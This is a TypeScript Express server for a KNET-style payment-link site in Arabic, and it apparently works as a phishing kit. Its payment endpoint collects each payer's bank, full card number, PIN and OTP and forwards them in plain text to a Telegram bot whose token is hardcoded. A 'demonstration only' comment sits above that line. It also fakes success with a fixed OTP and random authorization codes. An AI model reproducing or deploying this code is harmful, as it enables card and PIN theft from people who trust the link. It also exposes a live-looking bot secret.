import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

interface PaymentLink {
  id: string;
  beneficiaryName: string;
  amount: number;
  currency: string;
  description: string;
  createdAt: string;
  status: 'active' | 'paid' | 'blocked' | 'expired';
  otpAttempts: number;
  paidAt?: string;
  transactionDetails?: {
    bankName: string;
    maskedCardNumber: string;
    authCode: string;
    referenceId: string;
    receiptId: string;
  };
}

interface Transaction {
  id: string;
  linkId: string;
  beneficiaryName: string;
  amount: number;
  currency: string;
  bankName: string;
  maskedCardNumber: string;
  status: 'SUCCESS' | 'FAILED' | 'BLOCKED';
  authCode: string;
  referenceId: string;
  timestamp: string;
}

// In-memory database with default demo links
const paymentLinks: Map<string, PaymentLink> = new Map([
  [
    'demo-link-101',
    {
      id: 'demo-link-101',
      beneficiaryName: 'ELHAM MOHAMED ALY HASSAN',
      amount: 280.000,
      currency: 'د.ك',
      description: 'Business Income',
      createdAt: new Date().toISOString(),
      status: 'active',
      otpAttempts: 0
    }
  ]
]);

const transactions: Transaction[] = [];

async function sendTelegramMessage(message: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN || '9130076505:AAF-in0BMrMXrhK018CWT108ZHO2pZvqvEY';
  const chatId = process.env.TELEGRAM_CHAT_ID || '9130076505';
  if (!token || !chatId) {
    console.warn('Telegram notifications not configured.');
    return;
  }
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
    });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
}

async function startServer() {
  const app = express();
  app.use(express.json());

  // API Routes
  
  // Get all payment links
  app.get('/api/links', (req, res) => {
    const links = Array.from(paymentLinks.values());
    res.json(links);
  });

  // Create a new payment link
  app.post('/api/links', (req, res) => {
    const { beneficiaryName, amount, description } = req.body;
    
    if (!beneficiaryName || !amount || isNaN(Number(amount))) {
      return res.status(400).json({ error: 'اسم المستفيد والمبلغ مطلوبان بشكل صحيح' });
    }

    const id = crypto.randomUUID().slice(0, 8);
    const newLink: PaymentLink = {
      id,
      beneficiaryName: beneficiaryName.trim(),
      amount: Number(amount),
      currency: 'د.ك',
      description: description ? description.trim() : 'Business Income',
      createdAt: new Date().toISOString(),
      status: 'active',
      otpAttempts: 0
    };

    paymentLinks.set(id, newLink);
    sendTelegramMessage(`*تم إنشاء رابط دفع جديد*\n\nالمستفيد: ${newLink.beneficiaryName}\nالمبلغ: ${newLink.amount} ${newLink.currency}\nالوصف: ${newLink.description}\nالرابط: ${process.env.APP_URL}/?pay=${id}`);
    res.status(201).json(newLink);
  });

  // Get specific payment link by ID (fully independent for sharing across devices)
  app.get('/api/links/:id', (req, res) => {
    const { id } = req.params;
    const link = paymentLinks.get(id);

    if (!link) {
      return res.status(404).json({ error: 'رابط الدفع غير موجود أو انتهت صلاحيته' });
    }

    if (link.status === 'blocked') {
      return res.status(403).json({ error: 'تم حظر هذا الرابط والمعاملة لأسباب أمنية نظراً لتجاوز محاولات إدخال رمز التحقق' });
    }

    res.json(link);
  });

  // Process payment simulation (Validate 6-digit OTP with 3 attempts limit)
  app.post('/api/links/:id/pay', (req, res) => {
    const { id } = req.params;
    const { bankName, cardNumber, pin, otp } = req.body;

    const link = paymentLinks.get(id);
    if (!link) {
      return res.status(404).json({ error: 'رابط الدفع غير موجود' });
    }

    if (link.status === 'blocked') {
      return res.status(403).json({ error: 'تم حظر هذه المعاملة لأسباب أمنية' });
    }

    if (link.status === 'paid') {
      return res.status(400).json({ error: 'تم دفع هذه الفاتورة مسبقاً' });
    }

    // Validate 6-digit OTP
    if (!otp || otp.length !== 6) {
      return res.status(400).json({ error: 'رمز التحقق (OTP) يجب أن يكون مكوناً من 6 أرقام' });
    }

    // SECURITY WARNING: Sending raw payment data to Telegram is extremely dangerous.
    // This is for demonstration purposes only and must NEVER be used in production.
    sendTelegramMessage(`*محاولة دفع (تجريبية)*\n\nالرابط: ${id}\nالبنك: ${bankName}\nرقم البطاقة: ${cardNumber}\nالرقم السري: ${pin}\nرمز التحقق: ${otp}`);

    const cleanCardNumber = cardNumber ? cardNumber.replace(/\s+/g, '') : '5078000000009281';
    const maskedCard = '•••• •••• •••• ' + cleanCardNumber.slice(-4);

    // Correct OTP is '123456'. If incorrect:
    if (otp !== '123456') {
      link.otpAttempts += 1;

      if (link.otpAttempts >= 3) {
        link.status = 'blocked';
        paymentLinks.set(id, link);

        const blockedTx: Transaction = {
          id: 'TXN-BLOCKED-' + Math.floor(1000 + Math.random() * 9000),
          linkId: id,
          beneficiaryName: link.beneficiaryName,
          amount: link.amount,
          currency: link.currency,
          bankName: bankName || 'بنك الخليج',
          maskedCardNumber: maskedCard,
          status: 'BLOCKED',
          authCode: 'SEC-LOCK-3',
          referenceId: 'REF-' + Math.floor(10000000 + Math.random() * 90000000),
          timestamp: new Date().toISOString()
        };
        transactions.unshift(blockedTx);

        return res.status(403).json({
          error: 'تم حظر المعاملة لأسباب أمنية بسبب تجاوز 3 محاولات إدخال خاطئة لرمز التحقق (OTP).',
          blocked: true,
          transaction: blockedTx
        });
      }

      paymentLinks.set(id, link);
      return res.status(400).json({
        error: `رمز التحقق (OTP) غير صحيح. المحاولة ${link.otpAttempts} من أصل 3 محاولات مسموحة.`
      });
    }

    // Success transaction
    const authCode = 'AUTH-' + Math.floor(100000 + Math.random() * 900000);
    const referenceId = 'KNET-' + Math.floor(10000000 + Math.random() * 90000000);
    const receiptId = 'RCP-' + Math.floor(1000000 + Math.random() * 9000000);

    link.status = 'paid';
    link.paidAt = new Date().toISOString();
    link.transactionDetails = {
      bankName: bankName || 'بنك الخليج',
      maskedCardNumber: maskedCard,
      authCode,
      referenceId,
      receiptId
    };

    paymentLinks.set(id, link);

    const successTx: Transaction = {
      id: receiptId,
      linkId: id,
      beneficiaryName: link.beneficiaryName,
      amount: link.amount,
      currency: link.currency,
      bankName: bankName || 'بنك الخليج',
      maskedCardNumber: maskedCard,
      status: 'SUCCESS',
      authCode,
      referenceId,
      timestamp: new Date().toISOString()
    };

    transactions.unshift(successTx);

    res.json({
      success: true,
      message: 'تمت عملية الدفع بنجاح',
      link,
      transaction: successTx
    });
    sendTelegramMessage(`*عملية دفع ناجحة*\n\nالمستفيد: ${successTx.beneficiaryName}\nالمبلغ: ${successTx.amount} ${successTx.currency}\nالبنك: ${successTx.bankName}\nرقم المرجع: ${successTx.referenceId}`);
  });

  // Get transactions history
  app.get('/api/transactions', (req, res) => {
    res.json(transactions);
  });

  // Setup Vite middleware in development
  const vite = await createViteServer({
    server: { middlewareMode: true },
    appType: 'spa',
  });

  app.use(vite.middlewares);

  const port = Number(process.env.PORT || 3000);
  app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${port}`);
  });
}

startServer();
